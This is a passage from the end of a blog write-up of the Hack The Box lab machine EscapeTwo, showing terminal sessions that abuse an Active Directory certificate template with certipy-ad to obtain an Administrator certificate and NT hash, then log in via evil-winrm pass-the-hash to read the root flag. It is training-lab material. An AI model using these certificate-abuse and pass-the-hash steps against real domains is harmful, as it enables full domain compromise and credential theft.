+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ certipy-ad  req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.129.68.137 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.129.68.137 -dns dc01.sequel.htb</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\(&#x27;</span></span><br><span class="line">  <span class="string">&quot;(0x[a-zA-Z0-9]+) \([-]?[0-9]+ &quot;</span>,</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 14</span><br><span class="line">[*] Got certificate with multiple identifications</span><br><span class="line">    UPN: <span class="string">&#x27;Administrator@sequel.htb&#x27;</span></span><br><span class="line">    DNS Host Name: <span class="string">&#x27;dc01.sequel.htb&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;administrator_dc01.pfx&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+
+<p>Finally we can use that certificate to get the administrator hash for auth:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">                                                                                      </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ certipy-ad  auth -pfx administrator_dc01.pfx  -dc-ip 10.129.68.137 -debug</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Found multiple identifications <span class="keyword">in</span> certificate</span><br><span class="line">[*] Please <span class="keyword">select</span> one:</span><br><span class="line">    [0] UPN: <span class="string">&#x27;Administrator@sequel.htb&#x27;</span></span><br><span class="line">    [1] DNS Host Name: <span class="string">&#x27;dc01.sequel.htb&#x27;</span></span><br><span class="line">&gt; 2</span><br><span class="line">[!] Invalid index</span><br><span class="line">[*] Please <span class="keyword">select</span> one:</span><br><span class="line">    [0] UPN: <span class="string">&#x27;Administrator@sequel.htb&#x27;</span></span><br><span class="line">    [1] DNS Host Name: <span class="string">&#x27;dc01.sequel.htb&#x27;</span></span><br><span class="line">&gt; 3</span><br><span class="line">[!] Invalid index</span><br><span class="line">[*] Please <span class="keyword">select</span> one:</span><br><span class="line">    [0] UPN: <span class="string">&#x27;Administrator@sequel.htb&#x27;</span></span><br><span class="line">    [1] DNS Host Name: <span class="string">&#x27;dc01.sequel.htb&#x27;</span></span><br><span class="line">&gt; 0</span><br><span class="line">[*] Using principal: administrator@sequel.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@sequel.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff</span><br></pre></td></tr></table></figure></div>
+
+<p>And we can use that to connect as administrator and get our root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/escapetwo]</span><br><span class="line">└─$ evil-winrm -u administrator -i 10.129.68.137 -H 7a8d4e04986afa8ed4060f75e5a0b3ff</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                     </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                       </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cd</span> ../desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <span class="built_in">cat</span> root.txt</span><br><span class="line">c86723147bad97447b5c21d88c037d07</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for EscapeTwo, hope you enjoyed it! And sorry for the short writeup its because I spent the full weekend playing HTB Business CTF haha.</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: EscapeTwo</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-05-25 19:22:03</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-05-25 21:11:24
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/05/25/Hackthebox-EscapeTwo/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/05/16/Hackthebox-Heal/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Heal</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: EscapeTwo</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-Access-accounts-xslx"><span class="nav-text">SMB Access - accounts.xslx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL-RCE-through-xp-cmdshell"><span class="nav-text">MSSQL - RCE through xp_cmdshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-Shadow-Credentials"><span class="nav-text">Privilege Escalation - Shadow Credentials</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ADCS-Abuse-ESC4"><span class="nav-text">ADCS Abuse - ESC4</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
